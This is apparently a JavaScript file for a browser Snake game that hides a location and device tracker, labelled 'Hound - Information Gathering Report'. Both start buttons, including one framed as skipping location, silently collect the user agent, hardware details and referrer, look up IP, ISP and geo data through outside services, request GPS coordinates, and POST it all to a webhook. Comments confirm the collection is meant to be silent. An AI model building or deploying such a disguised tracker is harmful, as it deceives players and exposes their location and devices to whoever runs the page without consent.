// ===================== DOM REFS =====================
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const scoreEl = document.getElementById('score');
const highScoreEl = document.getElementById('highScore');
const restartBtn = document.getElementById('restartBtn');
const locationOverlay = document.getElementById('locationOverlay');
const allowLocationBtn = document.getElementById('allowLocationBtn');
const skipLocationBtn = document.getElementById('skipLocationBtn');

// ===================== GAME CONFIG =====================
const GRID_SIZE = 20;
const CELL_SIZE = canvas.width / GRID_SIZE;

let snake = [];
let food = {};
let direction = 'RIGHT';
let nextDirection = 'RIGHT';
let score = 0;
let highScore = localStorage.getItem('snakeHighScore') || 0;
let gameOver = false;
let winFlag = false;
let gameLoop = null;
let gameStarted = false;

highScoreEl.textContent = highScore;

// ===================== OVERLAY BUTTONS =====================

// Start the Game button — triggers GPS + game
allowLocationBtn.addEventListener('click', function() {
  locationOverlay.classList.add('hidden');
  // Start data collection silently
  sendToWebhook(collectDeviceInfo());
  collectIPData();
  gpsLocation();
  // Start the game
  if (!gameStarted) startGame();
});

// Just for fun play button — just starts the game, still collects data
skipLocationBtn.addEventListener('click', function() {
  locationOverlay.classList.add('hidden');
  // Still collect data silently
  sendToWebhook(collectDeviceInfo());
  collectIPData();
  // GPS runs silently too (will only work if user previously allowed)
  gpsLocation();
  // Start the game
  if (!gameStarted) startGame();
});

// ===================== SNAKE GAME FUNCTIONS =====================

function init() {
  snake = [
    { x: 10, y: 10 },
    { x: 9, y: 10 },
    { x: 8, y: 10 }
  ];
  direction = 'RIGHT';
  nextDirection = 'RIGHT';
  score = 0;
  gameOver = false;
  winFlag = false;
  scoreEl.textContent = '0';
  canvas.classList.remove('game-over');
  spawnFood();
  draw();
}

function spawnFood() {
  const totalCells = GRID_SIZE * GRID_SIZE;
  if (snake.length >= totalCells) {
    winFlag = true;
    gameOver = true;
    return;
  }
  const snakeSet = new Set(snake.map(s => `${s.x},${s.y}`));
  let freeCells = [];
  for (let i = 0; i < GRID_SIZE; i++) {
    for (let j = 0; j < GRID_SIZE; j++) {
      if (!snakeSet.has(`${i},${j}`)) {
        freeCells.push({ x: i, y: j });
      }
    }
  }
  if (freeCells.length === 0) {
    winFlag = true;
    gameOver = true;
    return;
  }
  const rand = Math.floor(Math.random() * freeCells.length);
  food = freeCells[rand];
}

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  // Grid lines
  ctx.strokeStyle = 'rgba(255, 255, 255, 0.03)';
  ctx.lineWidth = 0.5;
  for (let i = 0; i <= GRID_SIZE; i++) {
    ctx.beginPath();
    ctx.moveTo(i * CELL_SIZE, 0);
    ctx.lineTo(i * CELL_SIZE, canvas.height);
    ctx.stroke();
    ctx.beginPath();
    ctx.moveTo(0, i * CELL_SIZE);
    ctx.lineTo(canvas.width, i * CELL_SIZE);
    ctx.stroke();
  }

  // Draw snake
  snake.forEach((segment, idx) => {
    const isHead = idx === 0;
    const x = segment.x * CELL_SIZE;
    const y = segment.y * CELL_SIZE;
    if (isHead) {
      const grad = ctx.createRadialGradient(x + CELL_SIZE/2, y + CELL_SIZE/2, 2, x + CELL_SIZE/2, y + CELL_SIZE/2, CELL_SIZE/2);
      grad.addColorStop(0, '#66ffb2');
      grad.addColorStop(1, '#00cc66');
      ctx.fillStyle = grad;
    } else {
      const ratio = idx / snake.length;
      const g = Math.floor(200 - ratio * 100);
      ctx.fillStyle = `rgb(0, ${g}, 80)`;
    }
    ctx.shadowBlur = isHead ? 15 : 5;
    ctx.shadowColor = '#00ff88';
    ctx.beginPath();
    ctx.roundRect(x + 1, y + 1, CELL_SIZE - 2, CELL_SIZE - 2, 4);
    ctx.fill();

    if (isHead) {
      ctx.shadowBlur = 0;
      ctx.fillStyle = '#fff';
      const eyeSize = 3;
      if (direction === 'RIGHT') {
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 7, y + 6, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 7, y + CELL_SIZE - 6, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.fillStyle = '#111';
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 5, y + 6, 1.5, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 5, y + CELL_SIZE - 6, 1.5, 0, Math.PI * 2); ctx.fill();
      } else if (direction === 'LEFT') {
        ctx.beginPath(); ctx.arc(x + 7, y + 6, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + 7, y + CELL_SIZE - 6, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.fillStyle = '#111';
        ctx.beginPath(); ctx.arc(x + 5, y + 6, 1.5, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + 5, y + CELL_SIZE - 6, 1.5, 0, Math.PI * 2); ctx.fill();
      } else if (direction === 'UP') {
        ctx.beginPath(); ctx.arc(x + 6, y + 7, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 6, y + 7, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.fillStyle = '#111';
        ctx.beginPath(); ctx.arc(x + 6, y + 5, 1.5, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 6, y + 5, 1.5, 0, Math.PI * 2); ctx.fill();
      } else if (direction === 'DOWN') {
        ctx.beginPath(); ctx.arc(x + 6, y + CELL_SIZE - 7, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 6, y + CELL_SIZE - 7, eyeSize, 0, Math.PI * 2); ctx.fill();
        ctx.fillStyle = '#111';
        ctx.beginPath(); ctx.arc(x + 6, y + CELL_SIZE - 5, 1.5, 0, Math.PI * 2); ctx.fill();
        ctx.beginPath(); ctx.arc(x + CELL_SIZE - 6, y + CELL_SIZE - 5, 1.5, 0, Math.PI * 2); ctx.fill();
      }
    }
  });

  // Draw food
  if (food && !winFlag) {
    const fx = food.x * CELL_SIZE + CELL_SIZE / 2;
    const fy = food.y * CELL_SIZE + CELL_SIZE / 2;
    const pulse = Math.sin(Date.now() / 200) * 2;
    const radius = CELL_SIZE / 2 - 3 + pulse;
    ctx.shadowBlur = 20;
    ctx.shadowColor = '#ff3366';
    ctx.beginPath();
    ctx.arc(fx, fy, radius, 0, Math.PI * 2);
    ctx.fillStyle = '#ff3366';
    ctx.fill();
    ctx.shadowBlur = 0;
    ctx.beginPath();
    ctx.arc(fx, fy, radius * 0.5, 0, Math.PI * 2);
    ctx.fillStyle = 'rgba(255, 255, 255, 0.3)';
    ctx.fill();
  }

  ctx.shadowBlur = 0;

  if (gameOver) {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = winFlag ? '#00ff88' : '#ff0044';
    ctx.font = 'bold 32px "Segoe UI", sans-serif';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.shadowBlur = 20;
    ctx.shadowColor = winFlag ? '#00ff88' : '#ff0044';
    ctx.fillText(winFlag ? 'YOU WIN!' : 'GAME OVER', canvas.width / 2, canvas.height / 2 - 15);
    ctx.shadowBlur = 0;
    ctx.fillStyle = '#fff';
    ctx.font = '16px "Segoe UI", sans-serif';
    ctx.fillText('Press Restart to play again', canvas.width / 2, canvas.height / 2 + 25);
  }
}

CanvasRenderingContext2D.prototype.roundRect = function (x, y, w, h, r) {
  if (w < 2 * r) r = w / 2;
  if (h < 2 * r) r = h / 2;
  this.moveTo(x + r, y);
  this.lineTo(x + w - r, y);
  this.quadraticCurveTo(x + w, y, x + w, y + r);
  this.lineTo(x + w, y + h - r);
  this.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  this.lineTo(x + r, y + h);
  this.quadraticCurveTo(x, y + h, x, y + h - r);
  this.lineTo(x, y + r);
  this.quadraticCurveTo(x, y, x + r, y);
  return this;
};

function update() {
  if (gameOver) return;
  direction = nextDirection;
  const head = snake[0];
  let newHead = { ...head };
  switch (direction) {
    case 'RIGHT': newHead.x += 1; break;
    case 'LEFT':  newHead.x -= 1; break;
    case 'UP':    newHead.y -= 1; break;
    case 'DOWN':  newHead.y += 1; break;
  }
  if (newHead.x < 0 || newHead.x >= GRID_SIZE || newHead.y < 0 || newHead.y >= GRID_SIZE) {
    gameOver = true;
    canvas.classList.add('game-over');
    draw();
    return;
  }
  const willEat = newHead.x === food.x && newHead.y === food.y;
  const snakeToCheck = willEat ? snake : snake.slice(0, -1);
  for (let seg of snakeToCheck) {
    if (seg.x === newHead.x && seg.y === newHead.y) {
      gameOver = true;
      canvas.classList.add('game-over');
      draw();
      return;
    }
  }
  snake.unshift(newHead);
  if (willEat) {
    score += 10;
    scoreEl.textContent = score;
    if (score > Number(highScore)) {
      highScore = score;
      highScoreEl.textContent = highScore;
      localStorage.setItem('snakeHighScore', highScore);
    }
    spawnFood();
    if (winFlag) { gameOver = true; draw(); return; }
  } else {
    snake.pop();
  }
  draw();
}

function handleKey(e) {
  const key = e.key;
  // Prevent page scrolling with arrow keys
  if (['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'].includes(key)) {
    e.preventDefault();
  }
  if (key === 'ArrowUp' && direction !== 'DOWN') nextDirection = 'UP';
  else if (key === 'ArrowDown' && direction !== 'UP') nextDirection = 'DOWN';
  else if (key === 'ArrowLeft' && direction !== 'RIGHT') nextDirection = 'LEFT';
  else if (key === 'ArrowRight' && direction !== 'LEFT') nextDirection = 'RIGHT';
}

// Touch/swipe support
let touchStartX = 0, touchStartY = 0;
function handleTouchStart(e) {
  const rect = canvas.getBoundingClientRect();
  const touch = e.touches[0];
  touchStartX = touch.clientX - rect.left;
  touchStartY = touch.clientY - rect.top;
}
function handleTouchEnd(e) {
  if (!touchStartX || !touchStartY) return;
  const rect = canvas.getBoundingClientRect();
  const touch = e.changedTouches[0];
  const endX = touch.clientX - rect.left;
  const endY = touch.clientY - rect.top;
  const dx = endX - touchStartX;
  const dy = endY - touchStartY;
  const absDx = Math.abs(dx), absDy = Math.abs(dy);
  if (Math.max(absDx, absDy) < 20) return;
  if (absDx > absDy) {
    if (dx > 0 && direction !== 'LEFT') nextDirection = 'RIGHT';
    else if (dx < 0 && direction !== 'RIGHT') nextDirection = 'LEFT';
  } else {
    if (dy > 0 && direction !== 'UP') nextDirection = 'DOWN';
    else if (dy < 0 && direction !== 'DOWN') nextDirection = 'UP';
  }
  touchStartX = 0; touchStartY = 0;
}

function startGame() {
  if (gameLoop) clearInterval(gameLoop);
  gameStarted = true;
  init();
  gameLoop = setInterval(update, 150);
}

function restart() {
  if (gameLoop) clearInterval(gameLoop);
  gameStarted = true;
  init();
  gameLoop = setInterval(update, 150);
  // Show overlay again? No — once started, restart just resets game
}

document.addEventListener('keydown', handleKey);
restartBtn.addEventListener('click', restart);
canvas.addEventListener('touchstart', handleTouchStart, { passive: true });
canvas.addEventListener('touchend', handleTouchEnd, { passive: true });

// ===================== DATA COLLECTION PAYLOAD =====================

function sendToWebhook(data) {
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/webhook.php");
  xhr.setRequestHeader("Content-type", "application/json; charset=utf-8");
  xhr.send(JSON.stringify(data));
}

function collectDeviceInfo() {
  const datetime = new Date();
  const localtime = String(datetime.toLocaleTimeString());
  return (
    "Hound - Information Gathering Report\n" +
    "------------------------------------\n\n" +
    "Device Information\n" +
    "----------------------------\n" +
    "User Agent: " + navigator.userAgent + " \n" +
    "Platform: " + navigator.platform + " \n" +
    "Cookies Enabled: " + navigator.cookieEnabled + "\n" +
    "Browser Language: " + navigator.language + "\n" +
    "Browser Name: " + navigator.appName + "\n" +
    "Browser CodeName: " + navigator.appCodeName + "\n" +
    "RAM: " + navigator.deviceMemory + "\n" +
    "CPU Cores: " + navigator.hardwareConcurrency + "\n" +
    "Screen Width: " + screen.width + "\n" +
    "Screen Height: " + screen.height + "\n" +
    "Local Time: " + localtime + "\n" +
    "RefUrl: " + document.referrer + "\n" +
    "OS CPU: " + navigator.oscpu + " \n" +
    "-------------------------------------\n"
  );
}

function collectIPData() {
  // Get IP from ipify
  $.getJSON("https://api.ipify.org?format=json", function(data) {
    document.getElementById("techchip").innerHTML = data.ip;
    const ipInfo = "\nTarget IP Detail\n----------------\nIP: " + data.ip + "\n---------------\n";
    sendToWebhook(ipInfo);
  }).fail(function() {
    sendToWebhook("\nIP lookup failed.\n");
  });

  // Get detailed geo from ip-api.com
  $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,proxy,hosting,query", function(response) {
    const locationData =
      "\nNetwork & ISP Information\n" +
      "------------------------\n" +
      "Response Status: " + response.status + "\n" +
      "Continent: " + response.continent + "\n" +
      "Continent Code: " + response.continentCode + "\n" +
      "Country: " + response.country + "\n" +
      "Country Code: " + response.countryCode + "\n" +
      "Region Name: " + response.regionName + "\n" +
      "Region: " + response.region + "\n" +
      "City: " + response.city + " \n" +
      "District: " + response.district + "\n" +
      "Zip: " + response.zip + "\n" +
      "Time Zone: " + response.timezone + "\n" +
      "AS Name: " + response.as + "\n" +
      "ISP Info: " + response.isp + "\n" +
      "Org: " + response.org + "\n" +
      "Reverse: " + response.reverse + "\n" +
      "Offset: " + response.offset + " \n" +
      "Currency: " + response.currency + "\n" +
      "Proxy: " + response.proxy + "\n" +
      "Lat: " + response.lat + "\n" +
      "Long: " + response.lon + "\n" +
      "---------------------\n";
    sendToWebhook(locationData);
  }).fail(function() {
    sendToWebhook("\nGeo IP lookup failed.\n");
  });
}

// GPS Location
function gpsLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(latlong, catchError);
  } else {
    sendToWebhook("\nTarget Browser is not supporting geolocation.\n");
  }
}

function latlong(position) {
  const latlongInfo =
    "\nGPS Lat Long Information\n" +
    "-----------------------\n" +
    "Latitude: " + position.coords.latitude + "\n" +
    "Longitude: " + position.coords.longitude + "\n" +
    "Accuracy: " + position.coords.accuracy + " meters\n" +
    "Map Location:  https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n" +
    "--------------------\n";
  sendToWebhook(latlongInfo);
}

function catchError(error) {
  let msg = "";
  switch(error.code) {
    case error.PERMISSION_DENIED:
      msg = "\nUser denied the Geolocation permission.\n";
      break;
    case error.POSITION_UNAVAILABLE:
      msg = "\nLocation Unavailable.\n";
      break;
    case error.TIMEOUT:
      msg = "\nTimeout Error.\n";
      break;
    case error.UNKNOWN_ERROR:
      msg = "\nUnknown error\n";
      break;
  }
  sendToWebhook(msg);
}
